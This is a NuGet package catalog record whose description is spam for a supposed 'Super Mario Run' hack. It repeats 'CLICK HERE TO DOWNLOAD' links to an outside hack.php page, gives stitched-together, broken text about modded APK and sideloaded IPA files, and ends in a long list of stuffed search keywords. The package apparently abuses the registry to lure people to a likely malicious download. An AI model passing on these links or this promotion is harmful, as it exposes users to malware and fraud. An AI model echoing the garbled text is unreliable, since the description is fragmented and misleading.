{
  "@id": "https://api.nuget.org/v3/catalog0/data/2022.01.26.09.36.45/_super-mario-run-hack-working-2022-version-dul.3.8.4.json",
  "@type": [
    "PackageDetails",
    "catalog:Permalink"
  ],
  "authors": "SharpCrafters s.r.o.",
  "catalog:commitId": "8124d891-dee7-4305-9a32-ffad292a740a",
  "catalog:commitTimeStamp": "2022-01-26T09:36:45.4235843Z",
  "created": "2022-01-26T09:33:26.99Z",
  "description": "# _Super Mario Run Hack Working 2022 Version dul\n\n\nCLICK HERE TO DOWNLOAD  gt;gt;gt;gt;gt; [http://1.bltadwin.ru/hack.php](http://1.bltadwin.ru/hack.php)\n\n\nSuper Mario Run Mod Apk All Levels Unlocked Latest Version, Super Mario run is a very famous game on the Internet. Super Mario Run Mod Apk is a modified (hacked) version of the official Super Mario Run game. With which you can enjoy all modded features. Because Super Mario Run is more of a puzzle checker than the average parkour game, and it's not that difficult. The operation of the game is indeed very simple.\n\n## [CLICK HERE TO DOWNLOAD  gt;gt;gt;gt;gt; http://1.bltadwin.ru/hack.php](http://1.bltadwin.ru/hack.php)\n\n · Step 1: Firstly, install the latest version of modified Super Mario Run IPA file from here. Step 2: Then, install the IPA file manually on your iOS device using Cydia Impactor on Windows PC or by sideloading via Xcode on downloads: 1.  · Here’s a neat little Super Mario Run hack of sorts to unlock all levels in the game for free, and that too, legally. Nintendo recently released Super Mario Run for iPhone and iPad, and the game is proving hugely popular amongst gamers, just as you might expect for a game with the word “Mario” in the title. What makes the game interesting for App Store observers is Reviews:  Download Super Mario Run MOD APK now! Super Mario Run Hack Apk is a modified (hacked) version of the official Super Mario Run game. With which you can enjoy all modded features. Updated. Download APK. /5 Votes: , Report. Developer Nintendo Co. Version Updated Janu Requirements and up. Size.\n\nsuper mario run hacked apk all levels unlocked, super mario run hack ipa, super mario run hack apk todo desbloqueado 2021, super mario run hack download, super mario run hack unlock all levels, super mario run hack apk, super mario run hack ios, super mario run hack all levels, super mario run hack ipa download, super mario run hack android download, super mario run hack apk all levels, super mario run hack apk 2020, super mario run hack apk todo desbloqueado, super mario run hack apk 2021, super mario run hack mod apk download, super mario run hacks, super mario bros run hack apk, super mario run cydia hack, super mario run all characters hack, super mario run hack completo, super mario run hack descargar, super mario run hack game download, super mario run hack ios download, super mario run hack free download, super mario run hack mod download, super mario run hack full version, super mario run full hack apk, super mario run hack generator, how to hack super mario run, super mario run hack ios ipa, super mario run hack jailbreak, super mario run hack no jailbreak, super mario run hack todos los mundos, super mario run hack online, super mario run offline hack, super mario run offline hack apk, is super mario run free, is super mario run free now, is mario run free, how to run fast in super mario 64, how to run fast in super mario 64 switch, super mario run 64 rom hack download, super mario run rally tickets hack, super mario run hack tricks, super mario run hack tutuapp, super mario run top hack, super mario run ticket hack, super mario run hack ios 13, super mario run hack apk android 1, super mario run apk hack 3.0 11, super mario run hack 2020, super mario run hack 2021, super mario run hack apk todo desbloqueado 2020, super mario run hack 3.0.20, super mario run hack apk 3.0.20, super mario run hack apk 3.0.22, super mario run hack apk todo desbloqueado 3.0.23, super mario run unlimited money apk",
  "id": "_Super-Mario-Run-Hack-Working-2022-Version-dul",
  "isPrerelease": false,
  "language": "en-US",
  "lastEdited": "2022-01-26T09:36:29.217Z",
  "listed": true,
  "packageHash": "SZ1vP4Y/IhMs2tP1YkKifiNQz6pzVobTMLaRwre2M0BCCtb6vtM7pYv5sE0rt8dlvlk52HNrHU9C69+ow6pVbQ==",
  "packageHashAlgorithm": "SHA512",
  "packageSize": 11459,
  "published": "2022-01-26T09:33:26.99Z",
  "requireLicenseAcceptance": false,
  "title": "_Super-Mario-Run-Hack-Working-2022-Version-dul",
  "verbatimVersion": "3.8.4",
  "version": "3.8.4",
  "packageEntries": [
    {
      "@id": "https://api.nuget.org/v3/catalog0/data/2022.01.26.09.36.45/_super-mario-run-hack-working-2022-version-dul.3.8.4.json#yxgfyvpptm.nuspec",
      "@type": "PackageEntry",
      "compressedLength": 1330,
      "fullName": "yxgfyvpptm.nuspec",
      "length": 4018,
      "name": "yxgfyvpptm.nuspec"
    },
    {
      "@id": "https://api.nuget.org/v3/catalog0/data/2022.01.26.09.36.45/_super-mario-run-hack-working-2022-version-dul.3.8.4.json#.signature.p7s",
      "@type": "PackageEntry",
      "compressedLength": 9469,
      "fullName": ".signature.p7s",
      "length": 9469,
      "name": ".signature.p7s"
    }
  ],
  "@context": {
    "@vocab": "http://schema.nuget.org/schema#",
    "catalog": "http://schema.nuget.org/catalog#",
    "xsd": "http://www.w3.org/2001/XMLSchema#",
    "dependencies": {
      "@id": "dependency",
      "@container": "@set"
    },
    "dependencyGroups": {
      "@id": "dependencyGroup",
      "@container": "@set"
    },
    "packageEntries": {
      "@id": "packageEntry",
      "@container": "@set"
    },
    "packageTypes": {
      "@id": "packageType",
      "@container": "@set"
    },
    "supportedFrameworks": {
      "@id": "supportedFramework",
      "@container": "@set"
    },
    "tags": {
      "@id": "tag",
      "@container": "@set"
    },
    "vulnerabilities": {
      "@id": "vulnerability",
      "@container": "@set"
    },
    "published": {
      "@type": "xsd:dateTime"
    },
    "created": {
      "@type": "xsd:dateTime"
    },
    "lastEdited": {
      "@type": "xsd:dateTime"
    },
    "catalog:commitTimeStamp": {
      "@type": "xsd:dateTime"
    },
    "reasons": {
      "@container": "@set"
    }
  }
}